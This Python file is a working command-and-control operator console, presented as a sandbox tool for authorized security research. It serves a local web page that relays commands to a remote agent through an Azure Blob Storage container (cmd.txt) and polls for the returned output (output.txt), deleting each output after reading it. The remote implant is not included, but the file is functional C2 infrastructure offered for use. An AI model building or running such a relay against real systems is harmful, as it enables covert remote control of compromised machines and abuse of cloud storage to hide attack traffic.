"""
Dataverse Sandbox C2 Operator Console

Azure Blob Storage relay for authorized security research.
Serves a web UI to send commands and poll for output.

Usage:
    python3 c2_server.py --storage-account <name> --container <name> --sas-token <token> [--port 8082]
"""

import argparse
import json
import urllib.request
import urllib.error
from http.server import HTTPServer, BaseHTTPRequestHandler

CONFIG = {}

HTML = """<!DOCTYPE html>
<html><head><title>C2 Console</title><style>
body{background:#1a1a2e;color:#e0e0e0;font-family:monospace;margin:2em}
h2{color:#0ff}
#output{background:#0d0d1a;border:1px solid #333;padding:1em;white-space:pre-wrap;
  min-height:200px;max-height:500px;overflow-y:auto;margin-bottom:1em}
input[type=text]{width:70%;padding:8px;background:#0d0d1a;color:#0ff;border:1px solid #444}
button{padding:8px 16px;background:#0ff;color:#000;border:none;cursor:pointer;margin-left:4px}
.err{color:#f44}
</style></head><body>
<h2>C2 Console</h2>
<div id="output">Waiting for commands...</div>
<input type="text" id="cmd" placeholder="Enter command..." autofocus>
<button onclick="send()">Send</button>
<button onclick="poll()">Poll</button>
<script>
const out=document.getElementById('output');
function log(t){out.textContent+=t+'\\n';out.scrollTop=out.scrollHeight}
function send(){
  const c=document.getElementById('cmd').value.trim();
  if(!c)return;
  fetch('/cmd',{method:'POST',headers:{'Content-Type':'application/json'},
    body:JSON.stringify({cmd:c})})
  .then(r=>r.json()).then(d=>log('> '+c+'\\n[sent]')).catch(e=>log('[error] '+e));
  document.getElementById('cmd').value='';
}
function poll(){
  fetch('/poll').then(r=>r.json()).then(d=>{
    if(d.output)log(d.output); else log('[no output yet]');
  }).catch(e=>log('[poll error] '+e));
}
document.getElementById('cmd').addEventListener('keydown',e=>{if(e.key==='Enter')send()});
setInterval(poll,4000);
</script></body></html>"""


def blob_url(blob):
    return (
        f"https://{CONFIG['storage_account']}.blob.core.windows.net"
        f"/{CONFIG['container']}/{blob}?{CONFIG['sas_token']}"
    )


def upload_blob(blob, data):
    req = urllib.request.Request(
        blob_url(blob),
        data=data.encode(),
        method="PUT",
        headers={"x-ms-blob-type": "BlockBlob", "Content-Type": "text/plain"},
    )
    urllib.request.urlopen(req)


def download_blob(blob):
    req = urllib.request.Request(blob_url(blob), method="GET")
    with urllib.request.urlopen(req) as resp:
        return resp.read().decode()


def delete_blob(blob):
    req = urllib.request.Request(blob_url(blob), method="DELETE")
    urllib.request.urlopen(req)


class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == "/":
            self._respond(200, "text/html", HTML)
        elif self.path == "/poll":
            try:
                output = download_blob("output.txt")
                delete_blob("output.txt")
                self._json({"output": output})
            except urllib.error.HTTPError as e:
                if e.code == 404:
                    self._json({"output": None})
                else:
                    self._json({"error": str(e)}, 500)
        else:
            self._respond(404, "text/plain", "not found")

    def do_POST(self):
        if self.path == "/cmd":
            try:
                body = json.loads(self.rfile.read(int(self.headers["Content-Length"])))
                upload_blob("cmd.txt", body["cmd"])
                self._json({"status": "ok"})
            except Exception as e:
                self._json({"error": str(e)}, 500)
        else:
            self._respond(404, "text/plain", "not found")

    def _respond(self, code, ctype, body):
        self.send_response(code)
        self.send_header("Content-Type", ctype)
        self.end_headers()
        self.wfile.write(body.encode() if isinstance(body, str) else body)

    def _json(self, obj, code=200):
        self._respond(code, "application/json", json.dumps(obj))

    def log_message(self, fmt, *args):
        print(f"[c2] {args[0]}" if args else "")


def main():
    p = argparse.ArgumentParser(description="C2 operator console")
    p.add_argument("--storage-account", required=True)
    p.add_argument("--container", required=True)
    p.add_argument("--sas-token", required=True)
    p.add_argument("--port", type=int, default=8082)
    args = p.parse_args()
    CONFIG.update(
        storage_account=args.storage_account,
        container=args.container,
        sas_token=args.sas_token,
    )
    srv = HTTPServer(("127.0.0.1", args.port), Handler)
    print(f"[c2] listening on http://127.0.0.1:{args.port}")
    srv.serve_forever()


if __name__ == "__main__":
    main()
